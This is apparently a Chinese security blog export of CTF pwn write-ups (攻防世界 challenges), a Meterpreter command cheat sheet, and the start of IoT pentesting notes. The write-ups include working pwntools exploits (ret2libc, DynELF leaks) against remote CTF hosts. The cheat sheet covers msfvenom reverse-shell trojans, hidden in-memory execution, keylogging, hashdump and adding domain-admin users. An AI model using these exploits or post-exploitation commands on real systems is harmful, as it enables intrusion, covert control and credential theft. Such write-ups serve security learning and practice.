strcpy(dest,s)，dest为字符串拷贝目的栈，长度为0x14。\n\n\n![17627983-0f96bbadb310adc5.png](https://i.loli.net/2020/05/08/7oCFMwki9HutVlr.png)\n\n\n\n在字符串中发现cat flag,属于函数 what_is_this()，地址为0x0804868B.\n\n### 攻击思路\n\n可以利用栈溢出，令passwd直接覆盖dest,直接使函数返回what_is_this()。\n\n在字符拷贝过程中，输入0x14个字符，可覆盖函数返回地址，具体是否为0x14个字符，现在查看汇编语言：\n\n\n![17627983-255df211907024ca.png](https://i.loli.net/2020/05/08/fwHUd4pY5bWSnEN.png)\n\n\n\n\n\n![17627983-73596713043662d6.png](https://i.loli.net/2020/05/08/a9sNLkX6R5ve8G4.png)\n\n\n\n在字符串拷贝前，先将拷贝原地址和目的地址压入堆栈，在函数最开始压入ebp变量，在函数结尾存在leave指令，在32位程序中，leave指令等于mov esp,ebp和pop ebp。即：**在覆盖函数返回地址前，还有一次出栈操作，数值4字节。即覆盖之前还需将这4字节覆盖。**随机选取数值262.\n（what_is_this()函数的地址为4字节）\n\n262-0x14-4-4=234\n\n或者，我在gdb中调试程序，在strcpy下断点，passwd填上‘a’*262，观察到ebp值为4字节。\n\n\n![捕获.PNG](https://i.loli.net/2020/05/08/c84MRnrbJZA1zFH.png)\n\n\n\n\nexp:\n\n```\nfrom pwn import*\nsh=remote('111.198.29.45',39118)\nsh.recvuntil('Your choice:')\nflag=0x0804868B\nsh.sendline('1')\nsh.recvuntil('username:')\nsh.sendline('z')\nsh.recvuntil('passwd:')\npayload='a'*0x14+'aaaa'+p32(flag)+'a'*234\nsh.sendline(payload)\nsh.interactive()\n```\n\ncyberpeace{2a2d92a084e034be9c3a03bbab4f149b}\n","categories":[],"tags":["pwn"]},{"title":"攻防世界 guess_num","url":"/posts/52610/","content":"\n查看关键main()函数，发现gets(&v11)存在栈溢出\n\n\n![17627983-c6ff7c8db83a9ec7.png](https://i.loli.net/2020/05/08/9dWjqTSBtmRkHgG.png)\n\n\n进入sub_C3E()函数，确定满足条件即可cat flag。\n\n\n![17627983-1e961fbba4dff1bc.png](https://i.loli.net/2020/05/08/QgLDtJBZlhXYyFa.png)\n\n\n题目要求，先输入name,然后连续十次猜对数字得到flag, 进入V11,在栈中占0x20，可以覆盖到seed，使seed[0]已知，后使输入的v8等于随机数v10,拿到flag。\n\n>注：\n>（1）在调用rang()时，先利用srand()设好随机数种子，若未设置，rand()在调用的时候会自动设为1.\n>（2）libc共享库：可以使用命令 ldd guess_num 查找\n>（3）如何在脚本中调用动态库中的程序：python库ctypes模块，使用cdll.LoadLibrary('')\n>(4)什么情况程序在编译前加载了动态库：比如我们在使用print家族、puts等未在程序里声明的函数，需要通过引用动态库里面就有程序不用声明就能进行调用的函数。\n\nexp:\n\n\n![17627983-82da413e439821bd.png](https://i.loli.net/2020/05/08/hltLr1UKMu6qmcG.png)\n\n\n>解释：\n>引入pwn、ctypes模块；\n>remote连接其他主机服务；\n>elf=ELF(bin路径)本地运行pwn文件；\n>libc调用动态库;构造payload,随机数a覆盖到seed[0],设定随机数种子为1；\n>recvuntil()接收字符串；\n>sendline(payload)发送payload；\n>srand(1)设定随机数种子为1；\n>循环十次；\n>interactive()直接进行交互；\n\n\n![17627983-caa9a4e5b8ce9f1a.png](https://i.loli.net/2020/05/08/UXbv96WNxFriu3k.png)\n\n\n另一种方式：利用C程序，直接覆盖seed,爆出随机数，得到flag.\n\n\n![17627983-93fb0ad7c552854b.png](https://i.loli.net/2020/05/08/LoDke3q2xhGSPHU.png)\n\n\n![YnNVrd.png](https://s1.ax1x.com/2020/05/08/YnNVrd.png)\n\n\n![YnNMPf.png](https://s1.ax1x.com/2020/05/08/YnNMPf.png)\n\n\ncyberpeace{c89cf2a54c56f16458a1164851a361b4}","categories":[],"tags":["pwn"]},{"title":"攻防世界 cgpwn2","url":"/posts/1776/","content":"\n\n算是简单题，进入hello()函数中发现gets(&s) 栈溢出漏洞。\n\nname是全局变量，在bss区段，适合写入。\n\npwn()函数中调用了__system，但并没有‘/bin/sh’\n\n\n![17627983-d0f4027f425eadcd.png](https://i.loli.net/2020/05/08/veR8Fb2xkDMifVz.png)\n\n\n\n\n\n![17627983-8f37fec1f7e9fab3.png](https://i.loli.net/2020/05/08/QPL4xp8Wws1DJUc.png)\n\n\n\n\n![17627983-a19abf21a8c9c0f7.png](https://i.loli.net/2020/05/08/abOyYLf9FERVqvZ.png)\n\n\n### 攻击思路\n\n在name中写入'/bin/sh'。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。\n\npayload=填充栈+覆盖保存的exp的值4字节+假的返回地址call __system('/bin/sh')\n\n\n```\nfrom pwn import *\n # p = process('./cgpwn2')\np = remote(\"111.198.29.45\",32966)\nsystem_addr = 0x804855A\nbss_addr = 0x804A080\np.recvuntil('name\\n')\np.sendline(\"/bin/sh\\x00\")\np.recvuntil('here:\\n')\npayload = 0x26*'a' +'bbbb'+ p32(system_addr) + p32(bss_addr)\np.sendline(payload)\np.interactive()\n```\n\ncyberpeace{f92dbe7e38fed8edda8b7513b09acdc7}\n\n\n","categories":[],"tags":["pwn"]},{"title":"攻防世界 pwn-100","url":"/posts/52788/","content":"\n## 分析\n\n查壳：checksec\n\n\n![查壳.PNG](https://i.loli.net/2020/05/31/mfOTnUiRdaMHtGE.png)\n\n\n64位，无stack,无PIE；\n\n\n![1.PNG](https://i.loli.net/2020/05/31/sHDG4fSe6xELluo.png)\n\n\n运行程序，输入字符，无反馈，无限制。\n\n\n![漏洞.PNG](https://i.loli.net/2020/05/31/axJ5bmchdIwRsfM.png)\n\n\n\n![漏洞2.PNG](https://i.loli.net/2020/05/31/VCymAtHUqB7Pbei.png)\n\n\nida查看main函数，发现存在栈溢出，参数a1大小为0x40.然而函数中获取大于等于a2（a2=200）的数值存入了a1.\n\n## 攻击思路\n\n无system函数，无/bin/sh字符串，有read,puts。参数经过寄存器传递（也可IDA查看），可以泄露libc,写入/bin/sh。\n\n\n![寄存器传参.PNG](https://i.loli.net/2020/05/31/wnf1YmoagvHcM2k.png)\n\n\n\n![IDA查看寄存器.PNG](https://i.loli.net/2020/05/31/CrYc9oJgkWzthG2.png)\n\n\nputs只需要一个参数。寄存器rdi存放写入地址，rsi存放写入字节数。找到pop rdi;ret传参，即\n\n`pop rdi; ret`\n`pop rsi; pop r15; ret`\n\n\n![通过pop控制写入.PNG](https://i.loli.net/2020/05/31/c1NEeWTBvPy4OXj.png)\n\n\n> 注：调用read函数时，x86中参数直接放入栈中；x64设立了几个寄存器存放参数，调用函数时先向寄存器中放参数，当参数数量大于寄存器，才会像栈中放参数\n> 传参顺序默认从后先开始传入。x86 x64一样。\n\n此处需要学习利用寄存器传递参数。\n\n> 关于pwntools的DynELF，主要功能是通过不断传入默认的函数地址到自己写的leak函数内部，测试并获取libc版本，得到函数地址。又因为DynELF无法搜索字符串地址，所以我们需要传入所需字符串，在调用函数加载bash。\n\n由于需要不断传参测试，加载程序后libc地址都会变化，可以重置程序解决问题。\n\n初始化之后相当于一个新的程序，栈空间从新分配。此程序初始化段：\n\n\n![初始化.PNG](https://i.loli.net/2020/05/31/EDtReszWUadf94H.png)\n\n\n> 程序还需调用一个gadget,后续另起一篇学习\n\n\n\n![gadget.PNG](https://i.loli.net/2020/05/31/Kkm4sFIlzySxPZt.png)\n\n\n\n### exp:\n\n```#!usr/bin/python\n #coding=utf-8\nfrom pwn import *\n # context.log_level = 'debug'\nio = remote('124.126.19.106',46612)\n # io = process(\"./pwn-100\")\nelf = ELF(\"./pwn-100\")\nrop1 = 0x40075A #pop rbx_rbp_r12_r13_r14_r15\nrop2 = 0x400740 #rdx(r13), rsi(r14), edi(r15d)\npop_rdi_ret = 0x400763\n # start_addr = elf.symbols['_start']\nstart_addr = 0x400550\nputs_plt = elf.plt['puts']\nread_got = elf.got['read']\nbinsh_addr = 0x601000\ndef leak(addr):\n  payload = \"a\" * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)\n  payload = payload.ljust(200, \"a\")\n  io.send(payload)\n  io.recvuntil(\"bye~\\n\")\n  up = \"\"\n  content = \"\"\n  count = 0\n  while True:\n    c = io.recv(numb=1, timeout=0.5)\n    count += 1\n    if up == '\\n' and c == \"\":\n        content = content[:-1] + '\\x00'\n        break\n    else:\n        content += c\n        up = c\n  content = content[:4]\n  log.info(\"%#x => %s\" % (addr, (content or '').encode('hex')))\n  return content\nd = DynELF(leak, elf = elf)\nsys_addr = d.lookup('system', 'libc')\nlog.info(\"system_addr => %#x\", sys_addr)\npayload  = \"a\" * 0x48 + p64(rop1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)\npayload += p64(rop2)\npayload += \"\\x00\" * 56  \npayload += p64(start_addr)\npayload  = payload.ljust(200, \"a\")\nio.send(payload)\nio.recvuntil(\"bye~\\n\")\n # gdb.attach(io)\nio.send(\"/bin/sh\\x00\")\npayload = \"a\" * 0x48 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)\npayload = payload.ljust(200, \"a\")\nio.send(payload)\nio.interactive()\n```\n","categories":[],"tags":["pwn"]},{"title":"攻防世界 -pwn- 反应釜开关控制","url":"/posts/55706/","content":"\n## checksec:\n\n![checksec.PNG](https://i.loli.net/2020/07/15/3D5qjSLvGN2CJzT.png)\n\n* 可以修改GOT表\n* 可以通过一处的方式来更改程序运行流\n* 堆栈不可执行\n* 地址随机化未开启\n\n## 分析\nIDA查看，发现有/bin/sh。\n\n\n![shell.PNG](https://i.loli.net/2020/07/15/wLf32ASzvt5brWm.png)\n\n\nget函数可溢出，偏移由v5得0x200h+0x8h(偏移对齐)=0x208h\n\n\n![v5.PNG](https://i.loli.net/2020/07/15/9mZH7GCz2u8LJq5.png)\n\n## exp\n\nexp:\n```\nfrom pwn import *\nr = remote('220.249.52.133',39331)\nelf = ELF('./control')\nshell_addr = 0x04005F6\npayload = 'A'*0x208 + p64(shell_addr)\nr.sendline(payload)\nr.interactive()```\n\n## 后记\n看了一下大佬的wp，结果原来是盲打题……","categories":[],"tags":["pwn"]},{"title":"攻防世界 -pwn-stack2","url":"/posts/14181/","content":"## 0x01 分析\nchecksec检查：\n\n![捕获.PNG](https://i.loli.net/2020/07/27/seUw8f5zIvPk9W7.png)\n\n32位，无PIE，开了NX和canary.\n运行一下是只有五个模块，展示数字，添加，更改，求平均数，退出。\n\nIDA中查看main函数：\n\n```\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v3; // eax\n  unsigned int v5; // [esp+18h] [ebp-90h]\n  unsigned int v6; // [esp+1Ch] [ebp-8Ch]\n  int v7; // [esp+20h] [ebp-88h]\n  unsigned int j; // [esp+24h] [ebp-84h]\n  int v9; // [esp+28h] [ebp-80h]\n  unsigned int i; // [esp+2Ch] [ebp-7Ch]\n  unsigned int k; // [esp+30h] [ebp-78h]\n  unsigned int l; // [esp+34h] [ebp-74h]\n  char v13[100]; // [esp+38h] [ebp-70h]\n  unsigned int v14; // [esp+9Ch] [ebp-Ch]\n  v14 = __readgsdword(0x14u);\n  setvbuf(stdin, 0, 2, 0);\n  setvbuf(stdout, 0, 2, 0);\n  v9 = 0;\n  puts(\"***********************************************************\");\n  puts(\"*                      An easy calc                       *\");\n  puts(\"*Give me your numbers and I will return to you an average *\");\n  puts(\"*(0 <= x < 256)                                           *\");\n  puts(\"***********************************************************\");\n  puts(\"How many numbers you have:\");\n  __isoc99_scanf(\"%d\", &v5);\n  puts(\"Give me your numbers\");\n  for ( i = 0; i < v5 && (signed int)i <= 0x63; ++i )\n  {\n    __isoc99_scanf(\"%d\", &v7);\n    v13[i] = v7;\n  }\n  for ( j = v5; ; printf(\"average is %.2lf\\n\", (double)((long double)v9 / (double)j)) )\n  {\n    while ( 1 )\n    {\n      while ( 1 )\n      {\n        while ( 1 )\n        {\n          puts(\"1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit\");\n          __isoc99_scanf(\"%d\", &v6);\n          if ( v6 != 2 )\n            break;\n          puts(\"Give me your number\");\n          __isoc99_scanf(\"%d\", &v7);\n          if ( j <= 0x63 )\n          {\n            v3 = j++;\n            v13[v3] = v7;\n          }\n        }\n        if ( v6 > 2 )\n          break;\n        if ( v6 != 1 )\n          return 0;\n        puts(\"id\\t\\tnumber\");\n        for ( k = 0; k < j; ++k )\n          printf(\"%d\\t\\t%d\\n\", k, v13[k]);\n      }\n      if ( v6 != 3 )\n        break;\n      puts(\"which number to change:\");\n      __isoc99_scanf(\"%d\", &v5);\n      puts(\"new number:\");\n      __isoc99_scanf(\"%d\", &v7);\n      v13[v5] = v7;\n    }\n    if ( v6 != 4 )\n      break;\n    v9 = 0;\n    for ( l = 0; l < j; ++l )\n      v9 += v13[l];\n  }\n  return 0;\n}\n```\n\n发现没有检查v13数组边界，当选择3.change number时程序没有对v5进行检测，存在数组越界，产生溢出：\n```\n puts(\"which number to change:\");\n      __isoc99_scanf(\"%d\", &v5);\n      puts(\"new number:\");\n      __isoc99_scanf(\"%d\", &v7);\n      v13[v5] = v7;\n```\n\n发现给了/bin/bash:\n```\n:0804859B ; __unwind {\n.text:0804859B                 push    ebp\n.text:0804859C                 mov     ebp, esp\n.text:0804859E                 sub     esp, 18h\n.text:080485A1                 mov     eax, large gs:14h\n.text:080485A7                 mov     [ebp+var_C], eax\n.text:080485AA                 xor     eax, eax\n.text:080485AC                 sub     esp, 0Ch\n.text:080485AF                 push    offset command  ; \"/bin/bash\"\n.text:080485B4                 call    _system ;system\n.text:080485B9                 add     esp, 10h\n.text:080485BC                 nop\n.text:080485BD                 mov     edx, [ebp+var_C]\n.text:080485C0                 xor     edx, large gs:14h\n.text:080485C7                 jz      short locret_80485CE\n.text:080485C9                 call    ___stack_chk_fail\n```\n\n开启动态调试，在v13[v5]=v7处下断点，\n\n\n![linux输入.PNG](https://i.loli.net/2020/07/31/ClcWPX8p29JHxQk.png)\n\n\n转到IDA界面，查看此地址，此时edx存入的即为输入的数字9，在栈中的位置是：\n\n![捕获.PNG](https://i.loli.net/2020/07/31/j24baYfNMdlRrGD.png)\n\n得到了输入在栈中的位置，找到返回地址的位置覆盖掉就可以了。","categories":[],"tags":["pwn"]},{"title":"攻防世界 level3","url":"/posts/5353/","content":"\n\n这道题对于我来讲好难好难啊，涉及到了很多新的知识。\n首先checksec\n\n\n![17627983-3b321a2edea9a331.png](https://i.loli.net/2020/05/08/uFc1bxINidnvHVl.png)\n\n\n:可以直接栈溢出；基地址不变化；对数据有执行权限。\n\n查看main()函数：\n\n\n![17627983-fde84f52ba2311ab.png](https://i.loli.net/2020/05/08/eFk7XyEv6ZKtGxd.png)\n\n\n\n查看函数function()：\n\n\n![捕获.PNG](https://i.loli.net/2020/05/08/doMwxehS3tCsbFq.png)\n\n\n无system,无/bin/sh，给了一个共享文件libc_32.so.6,明显为ret2libc。\n\n> ret2libc (return-into-libc)是一种利用缓冲区溢出的代码复用技术，主要通过覆盖栈帧的返回地址（EIP），使其返回到系统中的库函数，利用库函数中已有的功能来实施attack，而不是直接定位到注入的shellcode。system函数属于libc，而libc.so动态链接库中的函数之间相对偏移是固定的。即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变，用工具来找到对应的libc文件。\n\n> ret2libc特征：1、没有/bin/sh；2、没有system和/bin/sh；3、无system和/bin/sh，但是给了libc.so文件；4、这三个全都没有。\n\n> ASLR：地址空间布局随机化，ios,android,windows,macos,linux的当前版本都具有ASLR保护。主要用于防止缓冲区溢出攻击，ASLR与虚拟内存管理一起工作，将程序的不同部分的位置随机化，令攻击者不能通过尝试和错误了解目标位置，因为地址将不同。\n\nread()函数中，buf大小为0x88，但是在函数中竟然规定了256之大。明显的栈溢出。\n\n### 攻击思路\n\nlibc内的地址是随机的，但是函数的相对地址是不变的，只要知道其中某一个函数的地址，再利用相对位移计算出我们所需要的函数的地址，如果知道read或write函数的地址就可以计算出其他函数的地址。\n\n某大佬攻击思路：\n\n（1）通过function()中的read构造栈溢出，并且覆写返回地址为plt中的write地址。（2）通过wirte泄露read在内存中的绝对地址，并且接着调用function()（注：got中的read保存着read在内存中的真实地址）（3）计算出system和/bin/sh的绝对地址，再通过function构造栈溢出进行覆写。（4）成功\n\n> plt：procedure Linkage Table，延迟绑定，函数第一次用到时才进行绑定（符号查找，重定位等）；\n实现手法：增加一层间接跳转。\n调用函数时并不直接通过GOT跳转，而是通过一个叫做PLT的项的结构来进行跳转，每个外部函数在PLT中都有一个相应的项。\nELF将GOT拆分成两个表叫做.got和.got.plt。\n.got用来保存全局变量引用的地址\n.got.plt用来保存函数引用的地址，外部函数的引用全部放到 .plt.got中。\n\n**思路** \n\n通过read覆盖返回地址没执行两次main函数，第一次泄露write函数的地址，第二次执行system函数。\n\nexp:\n\n```\nfrom pwn import*\np=remote('111.198.29.45',52277)\n # p=process(\"./level3\")\n # 获取文件对象\nelf=ELF('./level3')\n #获取lib库对象\nlibc=ELF('./libc_32.so.6')\n #获取函数\nwirte_plt=elf.plt['write']\nwrite_got=elf.got[write']\nmain_addr=elf.sym['main']\n #接受数据\np.recvuntil(\":\\n\")\n  #char[88],ebp write函数地址，write函数返回地址（返回到main函数） write函数参数一（1）  write函数参数二（write_got的地址）write参数三（写4字节）\npayload=0x88*'a'+p32(0xdeadbeef)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)\np.sendline(payload)\n #获取wirte在got中的地址\nwrite_got_addr=u32(p.recv())\nprint hex(write_got_addr)\n # 计算lib库加载基址\nlibc_base=write_got_addr-libc.sym['write']\nprint hex(libc_base)\n # 计算system的地址\nsystem_addr=libc_base+libc.sym['system']\nprint hex(bin_sh_addr)\n #计算字符串/bin/sh 的地址。0x15902b为偏移，通过命令：strings -a -t x libc_32.so.6 | grep \"/bin/sh\"获取\nbin_sh_addr=libc_base+0x15902b\nprint hex(bin_sh_addr)\n #char [88] ebp system system函数的返回地址 system函数的参数(bin_sh_addr)\npayload2=0x88*'a'+p32(0xdeadbeef)+p32(system_addr)+p32(0x11111111)+p32(bin_sh_addr)\n #接受数据\np.recvuntil(\":\\n\")\n #发送payloas\np.sendline(payload2)\n #切换交互模式\np.interactive()\n```\n","categories":[],"tags":["pwn"]},{"title":"攻防世界 -dice_game","url":"/posts/3013/","content":"## 0x01 Checksec\nlinux下checksec查壳，开启了relro nx pie防护：\n\n![pwn-checksec.PNG](https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png)\n## 0x02 分析\n\nIDA打开，主函数：\n\n```\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  char buf[55]; // [rsp+0h] [rbp-50h]\n  char v5; // [rsp+37h] [rbp-19h]\n  ssize_t v6; // [rsp+38h] [rbp-18h]\n  unsigned int seed[2]; // [rsp+40h] [rbp-10h]\n  unsigned int v8; // [rsp+4Ch] [rbp-4h]\n  memset(buf, 0, 0x30uLL);\n  *(_QWORD *)seed = time(0LL);\n  printf(\"Welcome, let me know your name: \", a2);\n  fflush(stdout);\n  v6 = read(0, buf, 0x50uLL);\n  if ( v6 <= 49 )\n    buf[v6 - 1] = 0;\n  printf(\"Hi, %s. Let's play a game.\\n\", buf);\n  fflush(stdout);\n  srand(seed[0]);\n  v8 = 1;\n  v5 = 0;\n  while ( 1 )\n  {\n    printf(\"Game %d/50\\n\", v8);\n    v5 = sub_A20();\n    fflush(stdout);\n    if ( v5 != 1 )\n      break;\n    if ( v5 )\n    {\n      if ( v8 == 50 )\n      {\n        sub_B28(buf);\n        break;\n      }\n      ++v8;\n    }\n  }\n  puts(\"Bye bye!\");\n  return 0LL;\n}\n```\n\n是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。\n\n```\nint __fastcall sub_B28(__int64 a1)\n{\n  char s; // [rsp+10h] [rbp-70h]\n  FILE *stream; // [rsp+78h] [rbp-8h]\n  printf(\"Congrats %s\\n\", a1);\n  stream = fopen(\"flag\", \"r\");\n  fgets(&s, 100, stream);\n  puts(&s);\n  return fflush(stdout);\n}\n```\n在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。\n\n\n![相差40.PNG](https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png)\n\n随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉\n## 0x03 exp\n```\nfrom pwn import *\nfrom ctypes import *\np=remote('220.249.52.133',34691)\nlibc=cdll.LoadLibrary(\"libc.so.6\")\np.recv()\npayload=0x40*'a'+p64(0)\np.sendline(payload)\na=[]\nfor i in range(50):\n    a.append(libc.rand()%6+1)\nprint(a)\nfor i in a:\n    p.recv()\n    print(p.recv())\n    p.sendline(str(i))\np.interactive()\n```","categories":[],"tags":["pwn"]},{"title":"初识 Meterpreter","url":"/posts/53615/","content":"\n## 什么是Meterpreter\n\nmetrepreter 是metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道，使用它作为攻击载荷能够获得目标系统的一个meterpreter shell的链接。\n> meterpreter shell作为渗透模块有很多有用的功能，如：添加用户、隐藏、打开shell、得到用户密码、上传下载远程主机文件、运行cmd、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息 网络接口 ip地址等信息。\n> Meterpreter能够躲避入侵检测系统，在远程主机上隐藏自己，不改变系统硬盘中的文件\n> Meterpreter 是一种后渗透工具，属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型payload，此工具基于内存DLL注入理念实现，通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现。\n\n## Meterpreter中常用反弹类型\n\n### 1.reverse_tcp\n\n基于TCP的反向链接反弹shell，使用稳定。\n\n* Linux:\n\t* linux下反弹shell木马：\n\t* `msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f elf -o shell`\n\t* 目录下生成木马文件isshell，为文件加可执行权限，打开metasploit，使用模块handler设置payload(与生成木马所使用payload一致)\n\t* 设置地址和端口，开始监听。\n\t* 运行反弹shell木马，成功反弹回shell\n\n* Windows:\n\t* `msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的ip] lport=[端口] -f exe -o [要生成的文件名]`\n\t* `msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f exe -o shell.exe`\n\n### 2.reverse_http\n\n基于http方式的反向连接，网速慢的情况下不稳定。\n\n`payload: /windows/meterpreter/reverse_http`\n### 3.reverse_https\n\n基于https方式的反向连接，网速慢的情况下不稳定，https若反弹没收到数据，可以将监听端口换成443试试。\n\n`payload: /windows/meterpreter/reverse_https`\n### 4.bind_tcp\n\n基于TCP的正向连接shell，一般在内网使用，不需要设置LHOST。\n\n`msfvenom -p linux/x86/meterpreter/bind_tcp lport=4444 -f elf -o shell`\n\n加权运行。\n\n## Meterpreter 常用命令\n\n###1.基本命令\n\n* help --查看Meterpreter帮助\n* background --返回，把meterpreter后台挂起\n* bgkill --杀死一个背景 meterpreter 脚本\n* bglist --提供所有正在运行的后台脚本的列表\n* bgrun --作为一个后台线程运行脚本\n* channel --显示活动频道\n* sessions -i number  --与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用\n* sesssions -k  number  --与会话进行交互\n* close --关闭通道\n* exit --终止 meterpreter 会话\n* quit --终止 meterpreter 会话\n* interact id  --切换进一个信道\n* run --执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等\n* irb --进入 Ruby 脚本模式\n* read --从通道读取数据\n* write --将数据写入到一个通道\n* run和bgrun --前台和后台执行以后它选定的 meterpreter 脚本\n* use --加载 meterpreter 的扩展\n* load/use --加载模块\n* Resource --执行一个已有的rc脚本\n### 2.文件系统命令\n\n* cat c:\\boot.ini --查看文件内容,文件必须存在\n* del c:\\boot.ini --删除指定的文件\n* upload /root/Desktop/netcat.exe c:\\  --上传文件到目标机主上，如upload  setup.exe C:\\\\windows\\\\system32\\\n* download nimeia.txt /root/Desktop/   --下载文件到本机上如：download C:\\\\boot.ini /root/或者download C:\\\\\"ProgramFiles\"\\\\Tencent\\\\QQ\\\\Users\\\\295******125\\\\Msg2.0.db /root/\n* edit c:\\boot.ini   --编辑文件\n* getlwd --打印本地目录\n* getwd --打印工作目录\n* lcd --更改本地目录\n* ls --列出在当前目录中的文件列表\n* lpwd --打印本地目录\n* pwd --输出工作目录\n* cd c:\\\\  --进入目录文件下\n* rm file  --删除文件\n* mkdir dier  --在受害者系统上的创建目录\n* rmdir --受害者系统上删除目录\n* dir --列出目标主机的文件和文件夹信息\n* mv --修改目标主机上的文件名\n* search -d d:\\\\www -f web.config  --search 文件，如search  -d c:\\\\  -f*.doc\n* meterpreter > search -f autoexec.bat   --搜索文件\n* meterpreter > search -f sea*.bat c:\\\\xamp\\\\\n* enumdesktops      --用户登录数\n* 下载文件:使用命令“download +file path”,将下载目标机器的相对应权限的任何路径下的文件\n* 上传文件: upload 命令为上传文件到我们的目标机器\n* 查看文件: cat filename 在当前目录下查看文件内容，输入命令后便会返回给我们所查看文件的内容。\n* 切换、查询当前路径: pwd 命令将查询当前在dos命令下的路径，“cd”命令可以改变当前路径\n*  sysinfo 命令: 显示远程主机的系统信息，显示计算机、系统信息、结构、语言等信息。可以看到远程主机的操作系统是windows XP service pack 2，sp2这个系统有很多漏洞。\n*  execute命令: 为目标主机上执行一个命令，其中“execute -h”显示帮助信息。-f为执行要运行的命令\n\t* 如果希望隐藏后台执行，加参数-H `execute  -H -f notepad.exe`\n\t* 我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上 `execute  -H -i -f cmd.exe`\n\t* 在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀  `execute  -H -m -d notepad.exe-f  wce.exe -a \"-o wce.txt\" `\n\t\t* -d 在目标主机执行时显示的进程名称（用以伪装）\n\t\t* -m 直接从内存中执行\n\t\t* -o wce.txt 是wce.exe的运行参数\n* idletime命令:为显示目标机器截止到当前无操作命令的时间\n* search命令:在目标主机搜索特定的文件。该命令能够通过搜索整个系统或特定的文件夹。使用`search –h`命令来查看search命令的帮助信息\n* edit命令: 调用vi编辑器，对目标主机上的文件修改\n### 3.网络命令\n\n* ipconfig/ifconfig --显示网络接口的关键信息，包括 IP 地址\n* portfwd  add -l 4444 -p 3389 -r 192.168.1.102  --端口转发,本机监听4444,把目标机3389转到本机4444\n* netstat -an | grep“4444\"   --查看指定端口开放情况\n* rdesktop -u Administrator -p bk#123 127.0.0.1:4444  --使用rdesktop来连接桌面，-u 用户名 -p 密码\n* rdesktop 127.1.1.0:4444  --需要输入用户名和密码远程连接\n* route --查看或修改受害者路由表\n\t* route add 192.168.1.0 255.255.255.0 1  --添加动态路由\n\t* route print  --路由表输出\n\n* runget_local_subnets  --目标主机的内网IP段情况\n* Arp       --看ARP缓冲表\n* Getproxy     --获取代理\n* portfwd：网络命令则有列出ip信息(ipconfig),展示修改路由表(route),还有端口转发(portfwd)。\n### 4.键盘监听\n\n* keyscan_start：开启键盘记录功能\n* keyscan_dump：显示捕捉到的键盘记录信息\n* keyscan_stop：停止键盘记录功能\n* uictl enable keyboard/mouse --接管目标主机的键盘和鼠标。\n### 5.系统命令\n\n* reboot --重新启动受害人的计算机\n* reg --与受害人的注册表进行交互\n* rev2self  --回到控制目标主机的初始用户账户下\n* shell --获得控制台权限\n* shutdown --关闭了受害者的计算机\n* sysinfo  --查看目标机系统信息，如机器名，操作系统等\n* add_user username password -h ip     --在远程目标主机上添加一个用户\n* add_group_user \"Domain Admins\" username -h ip    --将用户添加到目标主机的域管理员组中\n","categories":[],"tags":["chrome"]},{"title":"《物联网渗透测试》学习笔记 1","url":"/posts/57077/","content":"# 0x01 IOT渗透测试\n定义IoT生态系统与渗透测试生命周期\n\n* 渗透测试方法：\n\t* 黑盒测试\n\t* 白盒测试\n\t* 灰盒测试\n## 固件入门\n固件是一种写入硬件设备的软件，作用是对应用和各项系统功能实施控制，运行固件的设备称为嵌入式系统。\n\n固件通常由bootloader、内核、文件系统以及其他资源组成，\n\n固件组成：闪存、bootloader、内核、根文件系统。\n\n* bootloader:主要作用包括RAM初始化（目的是存储易失性数据）、串口初始化、机器类型检测、内核参数链表设置、initramfs(基于RAM的初始文件系统)加载以及内核镜像调用等。ARM、MIPS架构中部分常见的bootloader包括：Redboot、u-boot以及barebox等。当bootloader启动内核之后，文件系统就完成了加载。\n* 固件可以采用的文件系统类型：SquashFS、cramFS、JFFS2、YAFFS2以及ext2等。\n## IoT中的Web应用\n通常嵌入书web应用被设计为在自包含的环境中运行\n\n* 目前iot领域主要有两种不同的web应用模型\n\t* 混合云模型：包含厂商或供应商提供的基于软件即服务的web应用，作用是同运行在嵌入式设备固件中的web应用程序建立连接，将数据从厂商的云服务器中同步到本地网络的嵌入式设备中。\n\t* 独立嵌入式服务器模型\n\nweb通信：浏览器、、嵌入式服务器和web应用服务器之间的通信通常要么借助简单对象访问协议（SOAP）/XML等web服务，要么借助基于http/htps复合REST规范的API来实现。\n## 硬件设备基础\n硬件输入：\n\n* EEPROM，是非易失性存储器。以单个字节为单位进行读写，可通过电荷或紫外线照射擦除数据。读写次数有限。\n* NAND闪存以区块为单位读写。存储设备的boootloader。\n* UART接口是访问设备最为常见的方式。连接改接口后即可获得root权限。PCB上UART接口的引脚定义中包括Tx、Rx、Vcc和GND 4个引脚。连接UART接口前需要使用万用表识别出引脚。\n* JTAG接口是遵循IEEE 